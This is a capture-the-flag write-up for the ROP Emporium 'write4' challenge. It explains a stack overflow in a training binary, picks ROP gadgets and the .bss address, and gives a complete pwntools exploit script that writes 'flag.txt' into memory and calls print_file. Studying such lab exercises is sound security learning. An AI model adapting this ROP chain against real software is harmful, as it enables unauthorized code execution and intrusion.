# write4

Our first foray into proper gadget use.
A useful function is still present, but we'll need to write a string into memory somehow.

## Writeup

We can check if the binary is stripped or not:

```
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
```

The binary is not stripped we can see function names.

Now check which checks are enabled in this binary:

```
[*] '/home/kali/ROP-Emporium/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is not executable, so we can't inject a shellcode.

The program in the **main** function call the function **pwnme**:

```c
void pwnme(void)
{
  undefined buffer [32];
  
  setvbuf(_stdout,(char *)0x0,2,0);
  puts("write4 by ROP Emporium");
  puts("x86_64\n");
  memset(buffer,0,32);
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0,buffer,512);
  puts("Thank you!");
  return;
}
```

This function insert **512 bytes** of user input into **32 bytes** of buffer.

The binary also has a function called **print_file**:

```c
void print_file(char *param_1)
{
  char buffer [40];
  FILE *fd;
  
  fd = (FILE *)0x0;
  fd = fopen(param_1,"r");
  if (fd == (FILE *)0x0) {
    printf("Failed to open file: %s\n",param_1);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(buffer,33,fd);
  puts(buffer);
  fclose(fd);
  return;
}
```

We need to put our string '**flag.txt**' somewhere, in order to use it as a parameter for the **print_file** function.

Inside the the binary there are these usefull **gadget**:

```
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x0000000000400693 : pop rdi ; ret
```

So we can put the string **flag.txt** into the stack, **pop** into the register **r15** and **pop** into the register **r14** the address where to store the string.

After that we can use the gadget **mov qword ptr [r14], r15** that store the string and call the function **print_file** with the address of the stored string.

We can use the **.bss** segment to store the string, we can find its address using:

```bash
objdump -x write4 | grep __bss_start
```

With this result:

```
0000000000601038 g       .bss   0000000000000000              __bss_start
```

This segment is **readable** and **writable**, so it is perfect for our purpose.

We can build the following payload:

```python
buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r14_r15 = 0x400628    # address of where the gadget is placed

string_address = 0x601038

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_r14_pop_r15),
    p64(string_address),
    b'flag.txt',
    p64(mov_qword_ptr_r14_r15),
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]
```

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write4')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r14_r15 = 0x400628    # address of where the gadget is placed

string_address = 0x601038

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_r14_pop_r15),
    p64(string_address),
    b'flag.txt',
    p64(mov_qword_ptr_r14_r15),
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]

payload = b''.join(payload)

io.sendlineafter(b'> ', payload)

io.interactive()
```

This will be the output:

```bash
Thank you!
ROPE{a_placeholder_32byte_flag!}
```